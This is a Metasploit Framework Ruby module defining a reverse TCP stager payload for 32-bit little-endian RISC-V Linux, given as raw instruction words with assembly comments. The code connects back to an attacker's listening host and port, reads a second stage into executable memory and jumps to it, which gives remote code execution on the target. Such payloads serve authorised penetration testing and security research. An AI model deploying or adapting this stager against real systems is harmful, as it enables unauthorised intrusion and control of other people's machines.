# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 232

  include Msf::Payload::Linux::Riscv32le::Prepends
  include Msf::Payload::Stager

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager',
        'Description' => 'Connect back to the attacker',
        'Author' => ['bcoles'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV32LE,
        'Handler' => Msf::Handler::ReverseTcp,
        'Stager' => {
          'Offsets' =>
                  {
                    'LPORT' => [ 226, 'n' ],
                    'LHOST' => [ 228, 'ADDR' ]
                  },
          'Payload' => stager_payload
        }
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    print_status("Transmitting stage length value... (#{payload.length} bytes)")
    conn.put([payload.length].pack('V'))
    true
  end

  private

  def stager_payload
    [
      # socket(AF_INET, SOCK_STREAM, 0)
      0x00200513,          # li    a0, 2             # AF_INET
      0x00100593,          # li    a1, 1             # SOCK_STREAM
      0x00000613,          # li    a2, 0             # IPPROTO_IP
      0x0c600893,          # li    a7, 198           # SYS_socket
      0x00000073,          # ecall
      0x00050493,          # mv    s1, a0            # save socket fd in s1

      # connect(s1, &sockaddr, 16)
      0x00048513,          # mv    a0, s1            # fd
      0x01000613,          # li    a2, 16            # addrlen
      0x0cb00893,          # li    a7, 203           # SYS_connect
      0xf0010113,          # addi  sp, sp, -256      # allocate stack
      0x00000297,          # auipc t0, 0             # t0 = PC
      0x0b828293,          # addi  t0, t0, 184       # t0 = &sockaddr (end of payload)
      0x0002a303,          # lw    t1, 0(t0)         # load sockaddr[0:3]
      0x00612023,          # sw    t1, 0(sp)         # store family+port
      0x0042a303,          # lw    t1, 4(t0)         # load sockaddr[4:7]
      0x00612223,          # sw    t1, 4(sp)         # store sin_addr
      0x00012423,          # sw    zero, 8(sp)       # sin_zero[0:3]
      0x00012623,          # sw    zero, 12(sp)      # sin_zero[4:7]
      0x00010593,          # mv    a1, sp            # a1 = &sockaddr on stack
      0x00000073,          # ecall
      0x08051263,          # bnez  a0, fail

      # read(s1, sp, 4) — read stage length
      0x00048513,          # mv    a0, s1            # fd
      0x00010593,          # mv    a1, sp            # buf = sp
      0x00400613,          # li    a2, 4             # count = 4
      0x03f00893,          # li    a7, 63            # SYS_read
      0x00000073,          # ecall

      # validate read returned exactly 4 bytes
      0x00400313,          # li    t1, 4
      0x06651463,          # bne   a0, t1, fail

      # mmap(NULL, aligned_length, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
      0x00012e03,          # lw    t3, 0(sp)         # t3 = stage length
      0x00000513,          # li    a0, 0             # addr = NULL
      0x00ce5593,          # srli  a1, t3, 12        # a1 = length >> 12
      0x00158593,          # addi  a1, a1, 1         # round up to next page
      0x00c59593,          # slli  a1, a1, 12        # a1 = aligned length
      0x00700613,          # li    a2, 7             # PROT_READ|PROT_WRITE|PROT_EXEC
      0x02200693,          # li    a3, 34            # MAP_PRIVATE|MAP_ANONYMOUS
      0xfff00713,          # li    a4, -1            # fd = -1
      0x00000793,          # li    a5, 0             # offset = 0
      0x0de00893,          # li    a7, 222           # SYS_mmap
      0x00000073,          # ecall

      # validate mmap succeeded
      0x02054c63,          # bltz  a0, fail

      0x000e0e93,          # mv    t4, t3            # t4 = remaining bytes
      0x00050f13,          # mv    t5, a0            # t5 = mmap base (exec target)
      0x00050f93,          # mv    t6, a0            # t6 = write pointer

      # read_loop: read(s1, ptr, remaining)
      0x00048513,          # mv    a0, s1            # fd
      0x000f8593,          # mv    a1, t6            # buf = write pointer
      0x000e8613,          # mv    a2, t4            # count = remaining
      0x03f00893,          # li    a7, 63            # SYS_read
      0x00000073,          # ecall
      0x00054a63,          # bltz  a0, fail          # read error
      0x00af8fb3,          # add   t6, t6, a0        # advance pointer
      0x40ae8eb3,          # sub   t4, t4, a0        # decrement remaining
      0xfe0e90e3,          # bnez  t4, read_loop     # loop if more data

      # jump to stage — socket fd in s1
      0x000f0067, # jr    t5               # jump to mmap'd stage

      # fail: exit(0)
      0x00000513,          # li    a0, 0
      0x05d00893,          # li    a7, 93            # SYS_exit
      0x00000073,          # ecall

      # sockaddr_in (patched by framework)
      0x5c110002,          # .short 2 (AF_INET), .short 4444 (port)
      0x0100007f           # .word 127.0.0.1 (LHOST)
    ].pack('V*')
  end
end
